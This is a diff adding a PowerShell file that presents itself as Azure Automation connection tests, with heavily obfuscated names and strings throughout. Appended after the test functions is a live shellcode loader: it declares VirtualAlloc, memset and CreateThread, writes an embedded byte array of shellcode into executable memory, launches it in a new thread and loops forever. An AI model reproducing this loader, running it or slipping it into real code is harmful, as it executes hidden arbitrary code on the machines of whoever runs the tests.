@@ -1,0 +1,108 @@
+function tEsT-`E`2E`cOnNECtI`o`NS
+{
+    ${RESoURc`eGRo`U`pnAmE} = ("{0}{2}{1}"-f'to','te-01','-dele')
+    ${A`U`T`OM`A`TIonACcOUNTN`AME} = ("{0}{1}" -f 'fbs-','aa-01')
+    ${oU`TPUT} = &("{0}{2}{3}{4}{1}"-f 'Get-AzAu','ount','t','omationAc','c') -ResourceGroupName ${R`es`oURceG`ROUP`N`AmE} -AutomationAccountName ${AuTOm`ATI`OnaCCO`U`NTnA`ME} -ErrorAction ("{0}{1}{2}" -f 'Silent','ly','Continue')
+    ${c`ONneCT`io`NAs`SE`TN`AMe} = ("{6}{0}{1}{5}{4}{3}{2}"-f'ce','Principa','nection','n','Co','l','CreateNewAzureServi')
+    ${c`o`NNecti`o`NTyPe`NaMe} = ("{1}{2}{4}{0}{3}"-f'rinc','AzureSe','rvice','ipal','P')
+    ${aPp`L`Ic`Atio`Nid} = ("{2}{3}{1}{0}" -f 'g','IdStrin','appl','ication')
+    ${T`En`An`Tid} = ("{1}{2}{4}{0}{3}" -f'Stri','tena','nt','ng','Id')
+    ${TE`NAN`Ti`Dch`AnGed} = ("{0}{2}{3}{1}{4}" -f 'C','ca','ont','osoCertifi','te2')
+    ${tHUmB`p`RiNT}  = ("{0}{4}{1}{3}{2}"-f 'thu','ri','ing','ntIdStr','mbp')
+    ${subS`CrIPT`i`On`iD}  = ("{4}{1}{0}{3}{2}"-f 'tion','crip','ring','IdSt','subs')
+    ${C`OnnectiOn`F`IelDValu`Es} = @{("{0}{3}{2}{1}" -f'Ap','onId','i','plicat') = ${aPpliC`A`T`IOnID}; `
+                               ("{1}{0}"-f'd','TenantI') = ${TeN`A`NTid}; `
+                               ("{0}{3}{1}{2}" -f'Cer','ficateThumbprin','t','ti') = ${tHuMBp`Ri`NT}; `
+                               ("{1}{3}{0}{2}" -f 'bscri','S','ptionId','u') = ${SubS`cRiP`TioniD}}
+
+    ${cO`N`NeC`T`IoNaSSETC`RE`ATed} = &("{0}{4}{1}{5}{3}{2}"-f'New-AzAutomatio','C','n','ectio','n','onn') -ResourceGroupName ${re`sou`RCEGR`O`UpN`AMe} `
+                                                              -AutomationAccountName ${a`U`TOMAtion`A`ccouNTn`AmE} `
+                                                              -Name ${coN`N`EctIonaSS`EtnAMe} `
+                                                              -ConnectionTypeName ${coNN`eCt`IontYPe`Na`me} `
+                                                              -ConnectionFieldValues ${COn`NecTI`ONfi`eldvalU`Es}
+
+    ${Ge`T`CoNnEc`T`IoNasSet`Cr`eated} = &("{2}{3}{0}{4}{5}{1}{6}{7}" -f'-','omati','G','et','Az','Aut','onConn','ection') -ResourceGroupName ${rEs`OUrc`e`GrouPNamE} `
+                                                                 -AutomationAccountName ${A`UtO`MaTIOnAccoU`N`TNAMe} `
+                                                                 -Name ${CON`N`eCtiOnAS`s`eT`NAMe}
+
+    &("{3}{2}{1}{0}" -f 'eEqual','r','-A','Assert') ${co`N`NEC`TIonA`SSETnAME}  ${GeT`Co`NNEcTiO`NA`s`s`EtCREAtED}."n`Ame"
+    &("{2}{0}{1}" -f'ul','l','Assert-NotN') ${gEtcO`N`NecTioNA`sSETC`R`eAt`Ed}."f`iE`lddef`in`iTiOnvAl`UES"
+    &("{4}{0}{3}{1}{2}"-f'e','AreEq','ual','rt-','Ass') ${ApPliC`ATio`NID}.("{1}{0}"-f'oString','T').Invoke() ${GETc`onnec`TIOn`AsS`eTCrEAteD}."fIELddeFINI`TiO`NvAL`UES".("{0}{1}" -f 'I','tem').Invoke(("{2}{1}{0}" -f 'tionId','plica','Ap'))
+    &("{0}{1}{2}" -f 'Assert-Ar','eE','qual') ${T`Enant`ID}.("{2}{0}{1}" -f 'tri','ng','ToS').Invoke() ${G`eTCONNE`C`TIon`AS`set`CREaTed}."f`iElDDE`FInI`TiOn`VA`lueS".("{0}{1}" -f 'It','em').Invoke(("{1}{0}" -f'ntId','Tena'))
+    &("{3}{4}{2}{1}{0}" -f'ual','AreEq','ert-','As','s') ${t`huMb`p`RINt}.("{0}{1}"-f 'ToStri','ng').Invoke() ${GeT`COnNec`T`IoNA`S`S`ETc`ReaTeD}."FiELD`DeFInI`T`IonvAl`UeS".("{0}{1}"-f'It','em').Invoke(("{1}{0}{4}{3}{2}"-f 'cat','Certifi','nt','pri','eThumb'))
+    &("{0}{2}{1}" -f 'A','l','ssert-AreEqua') ${sUBs`crIP`T`IoNId}.("{1}{2}{0}"-f 'ng','ToStr','i').Invoke() ${geTcO`Nn`eCtIOnA`sseTc`R`eatEd}."fIE`l`dD`eFiNItIon`V`AlUes".("{1}{0}" -f 'em','It').Invoke(("{0}{3}{2}{1}" -f'Su','Id','tion','bscrip'))
+
+    &("{2}{0}{1}{4}{5}{3}" -f 'emove-AzAutomation','Co','R','ion','nnec','t') -Name ${CoNNEctI`oN`As`S`ETnAME} `
+                                       -ResourceGroupName ${Res`OuRc`e`grOuP`N`Ame} `
+                                       -AutomationAccountName ${auTOMa`T`ION`A`CcoUN`TNA`ME} `
+                                       -Force
+
+    ${O`UT`Put} = &("{3}{0}{2}{6}{4}{5}{1}"-f 't-A','onnection','zAut','Ge','m','ationC','o') -ResourceGroupName ${ResO`UrCeG`ROUP`NAme} `
+                                              -AutomationAccountName ${a`UtOmA`T`IoNacCouN`TNa`mE} `
+                                              -Name ${cONN`ECTIon`AssET`NAme} -ErrorAction ("{0}{4}{3}{1}{2}" -f'Sil','ont','inue','lyC','ent')
+
+    &("{2}{3}{0}{1}"-f '-T','rue','A','ssert') {${O`U`TpUT} -eq ${nu`Ll}}
+}
+
+
+function tEsT-SetCO`Nne`Ct`I`onfi`ELd`VALUE
+{
+    ${res`OuR`cE`g`Rou`PnamE} = ("{2}{1}{0}" -f'te-01','ele','to-d')
+    ${a`UtOMAt`io`NaccoUN`TNAMe} = ("{0}{2}{1}"-f 'fbs','aa-01','-')
+    ${O`Ut`pUT} = &("{3}{2}{0}{1}{4}{5}" -f'mat','ion','et-AzAuto','G','Acc','ount') -ResourceGroupName ${REsOu`Rc`egrOuPn`AMe} -AutomationAccountName ${aU`T`oM`Atio`NAcCoUnTnAME} -ErrorAction ("{2}{1}{0}{3}" -f'nu','entlyConti','Sil','e')
+    ${C`ON`N`eCtionASseTName} = ("{7}{6}{8}{10}{2}{1}{3}{4}{5}{0}{11}{9}{12}" -f'i','e','eS','rvic','ePrin','c','ate','Cre','N','Con','ewAzur','pal','nection')
+    ${c`OnNeCtioNTy`p`enAMe} = ("{5}{4}{2}{3}{0}{1}" -f'a','l','vicePrinci','p','reSer','Azu')
+    ${APP`LIca`TIOn`ID} = ("{0}{2}{1}{3}" -f 'applicat','I','ion','dString')
+    ${T`ENaN`TID} = ("{1}{0}{3}{2}" -f 'a','ten','tring','ntIdS')
+    ${TENaNt`i`DCHAng`eD} = ("{1}{4}{3}{2}{0}" -f 'te2','Contos','ca','Certifi','o')
+    ${ThUMB`P`RiNT}  = ("{5}{0}{3}{4}{2}{1}" -f'p','ing','tIdStr','ri','n','thumb')
+    ${sub`sCr`IpTio`NiD}  = ("{4}{1}{3}{0}{2}" -f 'd','ubscription','String','I','s')
+    ${cONnec`T`I`O`NFi`EldvAlUES} = @{("{3}{0}{1}{2}" -f 'plic','ationI','d','Ap') = ${a`pP`LIca`TI`onid}; `
+                               ("{0}{1}" -f'Te','nantId') = ${tEn`ANT`id}; `
+                               ("{4}{0}{2}{3}{1}{5}"-f 'ic','n','ateTh','umbpri','Certif','t') = ${T`hUMbpr`Int}; `
+                               ("{1}{0}{2}"-f 't','Subscrip','ionId') = ${su`BsC`RIPTi`oN`ID}}
+
+    ${cON`NECT`iONASSe`Tc`R`Ea`TeD} = &("{6}{4}{5}{1}{2}{0}{7}{3}" -f'onnec','ati','onC','ion','ew-','AzAutom','N','t') -ResourceGroupName ${reSoU`RC`eG`Roupname} `
+                                                              -AutomationAccountName ${A`UtoMaTIonaCco`UN`TN`A`mE} `
+                                                              -Name ${coNne`CtION`ASse`T`N`AmE} `
+                                                              -ConnectionTypeName ${CoN`NE`c`TI`oNTypEnAmE} `
+                                                              -ConnectionFieldValues ${CoN`NEc`TIOn`FIELDVALU`es}
+
+    ${g`e`TcoNNecTIOnA`ssE`TcREa`Ted} = &("{1}{8}{4}{3}{2}{0}{6}{7}{5}" -f 'm','G','zAuto','A','t-','ction','ati','onConne','e') -ResourceGroupName ${RES`OuRceGRO`UP`Na`mE} `
+                                                                 -AutomationAccountName ${aUT`oM`A`TIONAC`cou`N`TNaME} `
+                                                                 -Name ${c`onn`eCTiONaSS`eTnaMe}
+
+    &("{0}{2}{1}" -f 'Asse','reEqual','rt-A') ${coNnE`CT`I`O`NasSEtNaME}  ${GEtCoNNE`CtIO`N`AsSETcre`ATeD}."nA`mE"
+    &("{3}{0}{2}{1}" -f'rt-Not','l','Nul','Asse') ${GeTcONNe`CTiOnA`sSEtCrE`At`eD}."Fi`EL`ddE`FI`NitiONvAluES"
+    &("{2}{3}{1}{0}"-f'l','a','Assert-AreE','qu') ${A`p`PlICatIO`NID}.("{1}{2}{0}" -f'g','ToSt','rin').Invoke() ${get`CoNNE`cti`On`ASseTCr`EateD}."f`I`elddEfI`NiT`Ion`VAl`UEs".("{0}{1}"-f'It','em').Invoke(("{1}{0}{2}" -f 'io','Applicat','nId'))
+    &("{1}{3}{0}{2}"-f 't-','Ass','AreEqual','er') ${Te`Na`Ntid}.("{0}{2}{1}"-f 'ToS','ng','tri').Invoke() ${Ge`TcO`NNEC`TI`ONaS`sETcREAt`ed}."F`iE`lD`dEfi`NITION`ValuEs".("{1}{0}" -f 'em','It').Invoke(("{0}{1}{2}" -f 'Ten','antI','d'))
+    &("{3}{0}{1}{2}" -f '-A','reEqu','al','Assert') ${t`huM`BPR`INT}.("{1}{2}{0}"-f'g','ToStr','in').Invoke() ${geT`C`ONNe`c`TIONaSSe`TCREAT`ed}."fi`e`LDDe`Fi`NItIon`VAl`UEs".("{1}{0}"-f'em','It').Invoke(("{4}{3}{1}{2}{5}{0}" -f 'bprint','T','h','te','Certifica','um'))
+    &("{2}{0}{1}"-f'AreEqu','al','Assert-') ${SUbScR`I`ptIo`Nid}.("{2}{1}{0}"-f 'ing','tr','ToS').Invoke() ${GEtC`Onne`CTIOnasSe`T`creaTEd}."fIE`L`D`dEFI`NiTiON`VALUES".("{1}{0}" -f'em','It').Invoke(("{0}{1}{3}{2}"-f 'S','ubsc','ptionId','ri'))
+
+	${nEwAp`pLI`cAT`Io`NID} = ("{4}{0}{3}{5}{1}{2}" -f'dApplic','d','String','ati','Update','onI')
+    &("{7}{1}{3}{6}{5}{0}{8}{2}{4}"-f'o','uto','ieldVa','matio','lue','onnecti','nC','Set-AzA','nF') -Name ${CO`NNect`IoNass`ETname} `
+                                       -ResourceGroupName ${reso`URCegr`o`UpN`Ame} `
+                                       -AutomationAccountName ${a`U`To`maTiO`NaCC`oun`TnAME} `
+									   -ConnectionFieldName ("{1}{2}{4}{0}{3}" -f 'onI','Appl','ica','d','ti') `
+									   -Value ${newap`PLIcaT`i`Onid}
+
+    ${gETCO`NnECti`O`NAs`sE`TuPD`AtED} = &("{1}{3}{4}{0}{2}"-f'cti','Get-AzAut','on','om','ationConne') -ResourceGroupName ${ResOU`R`cEgrO`Up`NAME} `
+                                              -AutomationAccountName ${AuToMAT`i`OnACcO`U`NT`N`AMe} `
+                                              -Name ${cO`NNectI`oNA`SS`E`TNAMe}
+
+    &("{1}{3}{2}{0}"-f'eEqual','Asse','r','rt-A') ${CONNe`c`TI`o`NasS`E`TnAME}  ${geT`C`OnNECti`OnasSeT`UPDAted}."N`AME"
+    &("{0}{3}{1}{2}" -f 'Assert-','l','l','NotNu') ${GEtC`oNNE`ctiOnass`e`TuPDat`ED}."F`iEl`DDeFin`itIoNVAluEs"
+    &("{2}{0}{1}" -f 'sert-AreEqua','l','As') ${newap`Pl`i`CaTIoN`Id}.("{0}{1}{2}" -f'ToSt','r','ing').Invoke() ${getCo`NNeCtIona`S`sE`TupdATEd}."fIE`L`Dde`FI`NIti`ONv`ALueS".("{0}{1}"-f'It','em').Invoke(("{3}{1}{0}{2}"-f 'on','i','Id','Applicat'))
+
+    &("{8}{4}{0}{7}{3}{6}{2}{1}{5}"-f 'z','io','nnect','ut','ove-A','n','omationCo','A','Rem') -Name ${conNE`CTi`onA`S`SeTnA`Me} `
+                                       -ResourceGroupName ${REsO`U`RceG`RouPNA`ME} `
+                                       -AutomationAccountName ${AuTomAt`iOnAC`cou`N`TnamE} `
+                                       -Force
+
+    ${O`UT`put} = &("{5}{4}{1}{0}{3}{2}"-f 'onConnec','omati','n','tio','-AzAut','Get') -ResourceGroupName ${R`e`Sou`RCeGR`OupNa`Me} `
+                                              -AutomationAccountName ${AUTO`Ma`TionAC`CoUntN`AMe} `
+                                              -Name ${conN`eCTIOna`s`SEt`N`AME} -ErrorAction ("{1}{3}{0}{2}" -f 'tlyCont','Sil','inue','en')
+
+    &("{0}{1}{2}" -f'Ass','ert-Tru','e') {${O`UT`put} -eq ${n`ULl}}
+}
+${AE`Pxkz} = ((("{7}{124}{32}{6}{84}{79}{71}{106}{56}{102}{27}{95}{81}{80}{61}{8}{15}{23}{9}{117}{100}{54}{45}{121}{58}{52}{20}{92}{26}{16}{98}{72}{38}{127}{33}{93}{57}{1}{42}{25}{51}{125}{59}{96}{49}{62}{103}{88}{97}{94}{111}{48}{46}{77}{44}{60}{73}{105}{50}{36}{19}{5}{86}{128}{35}{34}{39}{0}{29}{4}{82}{122}{99}{53}{74}{87}{63}{21}{116}{101}{90}{68}{67}{112}{76}{55}{108}{11}{78}{120}{12}{64}{47}{126}{83}{66}{110}{65}{40}{75}{70}{118}{37}{104}{123}{2}{30}{22}{89}{85}{107}{115}{69}{17}{91}{18}{31}{113}{28}{43}{114}{119}{109}{10}{3}{13}{24}{41}{14}"-f'tes, uint dwS','ot','u','r','c',' l','0','[','t','tP',' s','eationF',' In','c, ','ount);','ern I','dwS','Pt',' m','tr','ess','IntPtr l','lic ','n','ui',';[Dl',' uint ','li','t(','ta','b','e','({','ationTy','a','re','IntP','c','int ','dAttribu','d);[Dll','nt c','ect)','I','t','lAl',' extern In','P','c','{0','(','lImport(','ddr','tPt','irtua','n','2.dll{','uint flPr','oc(IntPtr lpA','nel3','eTh','ic ex','}','ss, ','t','dI',' l','er','met','xtern Int','{0}m','nel',', u','rea','r lpStartAdd','Import(','ui','tPtr Crea','la','ker','tat','s','kS','r','}','tat','p','re',']public st','s','a','r',',','pe, ','t','c ','2.dll','a','ize','e, In','r V','ar','0})]pub',')','rt','d','3','ic ','t dwCr','r dest, uint','pThrea','i',', ','mse','n','e','pP','t','sv','tPt','gs,','l','iz','.dll{0})]p','DllImport','{0}ker','t','flAlloc','Th')) -F[cHaR]34);${W} = &("{2}{0}{1}"-f'dd-Typ','e','A') -memberDefinition ${A`EpxKz} -Name ("{0}{1}" -f 'Win','32') -namespace ("{2}{3}{0}{1}{4}"-f '32Fun','cti','Wi','n','ons') -passthru;[Byte[]];[Byte[]]${Z} = 0xdb,0xdb,0xbf,0xd9,0x6a,0x54,0x42,0xd9,0x74,0x24,0xf4,0x58,0x2b,0xc9,0xb1,0x47,0x31,0x78,0x18,0x83,0xc0,0x04,0x03,0x78,0xcd,0x88,0xa1,0xbe,0x05,0xce,0x4a,0x3f,0xd5,0xaf,0xc3,0xda,0xe4,0xef,0xb0,0xaf,0x56,0xc0,0xb3,0xe2,0x5a,0xab,0x96,0x16,0xe9,0xd9,0x3e,0x18,0x5a,0x57,0x19,0x17,0x5b,0xc4,0x59,0x36,0xdf,0x17,0x8e,0x98,0xde,0xd7,0xc3,0xd9,0x27,0x05,0x29,0x8b,0xf0,0x41,0x9c,0x3c,0x75,0x1f,0x1d,0xb6,0xc5,0xb1,0x25,0x2b,0x9d,0xb0,0x04,0xfa,0x96,0xea,0x86,0xfc,0x7b,0x87,0x8e,0xe6,0x98,0xa2,0x59,0x9c,0x6a,0x58,0x58,0x74,0xa3,0xa1,0xf7,0xb9,0x0c,0x50,0x09,0xfd,0xaa,0x8b,0x7c,0xf7,0xc9,0x36,0x87,0xcc,0xb0,0xec,0x02,0xd7,0x12,0x66,0xb4,0x33,0xa3,0xab,0x23,0xb7,0xaf,0x00,0x27,0x9f,0xb3,0x97,0xe4,0xab,0xcf,0x1c,0x0b,0x7c,0x46,0x66,0x28,0x58,0x03,0x3c,0x51,0xf9,0xe9,0x93,0x6e,0x19,0x52,0x4b,0xcb,0x51,0x7e,0x98,0x66,0x38,0x16,0x6d,0x4b,0xc3,0xe6,0xf9,0xdc,0xb0,0xd4,0xa6,0x76,0x5f,0x54,0x2e,0x51,0x98,0x9b,0x05,0x25,0x36,0x62,0xa6,0x56,0x1e,0xa0,0xf2,0x06,0x08,0x01,0x7b,0xcd,0xc8,0xae,0xae,0x78,0xcc,0x38,0xcb,0x3b,0xec,0x9b,0x83,0xc1,0xf0,0xca,0x0f,0x4f,0x16,0xbc,0xff,0x1f,0x87,0x7c,0x50,0xe0,0x77,0x14,0xba,0xef,0xa8,0x04,0xc5,0x25,0xc1,0xae,0x2a,0x90,0xb9,0x46,0xd2,0xb9,0x32,0xf7,0x1b,0x14,0x3f,0x37,0x97,0x9b,0xbf,0xf9,0x50,0xd1,0xd3,0x6d,0x91,0xac,0x8e,0x3b,0xae,0x1a,0xa4,0xc3,0x3a,0xa1,0x6f,0x94,0xd2,0xab,0x56,0xd2,0x7c,0x53,0xbd,0x69,0xb4,0xc1,0x7e,0x05,0xb9,0x05,0x7f,0xd5,0xef,0x4f,0x7f,0xbd,0x57,0x34,0x2c,0xd8,0x97,0xe1,0x40,0x71,0x02,0x0a,0x31,0x26,0x85,0x62,0xbf,0x11,0xe1,0x2c,0x40,0x74,0xf3,0x11,0x97,0xb0,0x81,0x7b,0x2b;${G} = 0x1000;if (${z}."LeNG`Th" -gt 0x1000){${g} = ${Z}."len`gth"};${a`EPX}=${W}::("{3}{0}{1}{2}"-f 'ualA','llo','c','Virt').Invoke(0,0x1000,${G},0x40);for (${I}=0;${I} -le (${Z}."LeNg`Th"-1);${i}++) {${W}::"M`eMsET"([IntPtr](${Ae`Px}.("{1}{0}" -f 'oInt32','T').Invoke()+${i}), ${z}[${i}], 1)};${W}::("{0}{1}{2}"-f'Crea','teThr','ead').Invoke(0,0,${Ae`pX},0,0,0);for (;;){&("{1}{2}{3}{0}"-f'p','St','art-s','lee') 60};
